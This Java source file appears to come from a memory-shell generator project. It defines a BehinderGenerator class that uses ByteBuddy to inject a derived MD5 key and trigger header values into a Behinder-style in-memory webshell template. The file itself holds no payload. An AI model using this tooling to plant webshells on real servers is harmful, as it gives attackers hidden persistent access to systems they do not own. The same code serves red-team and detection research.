package com.reajason.javaweb.memshell.shelltool.behinder;

import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;

import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.dynamic.DynamicType;
import com.reajason.javaweb.utils.DigestUtils;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderGenerator extends ByteBuddyShellGenerator<BehinderConfig> {
    public BehinderGenerator(ShellConfig shellConfig, BehinderConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    public DynamicType.Builder<?> getBuilder() {
        String md5Key = DigestUtils.md5Hex(shellToolConfig.getPass()).substring(0, 16);
        return redefineTemplate()
                .field(named("pass")).value(md5Key)
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
    }
}
